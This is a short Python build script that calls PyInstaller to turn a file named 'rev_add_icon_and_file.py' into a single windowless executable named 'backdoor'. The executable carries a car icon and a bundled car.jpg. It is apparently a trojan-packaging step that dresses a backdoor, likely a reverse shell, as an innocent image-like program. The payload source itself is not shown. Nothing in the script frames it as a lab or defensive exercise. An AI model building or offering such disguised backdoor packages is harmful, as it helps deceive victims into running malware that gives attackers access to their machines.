import sys
import os
import subprocess

# Get the absolute path of the script file
script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))

# Specify the relative path to the image file
image_path = os.path.join(script_dir, "car.jpg")


# Get the absolute path of the script file
script_dir = sys.path[0]
script_path = os.path.join(script_dir, "rev_add_icon_and_file.py")

# Specify the relative paths to the icon and data files
icon_path = os.path.join(script_dir, "car.ico")
data_path = os.path.join(script_dir, "car.jpg")

# Build the PyInstaller command
pyinstaller_cmd = [
    "pyinstaller",
    script_path,
    "--name=backdoor",
    "--noconsole",
    "--add-data",
    f"{data_path};.",
    "--icon",
    icon_path,
    "--onefile"
]

# Run the PyInstaller command
subprocess.run(pyinstaller_cmd)
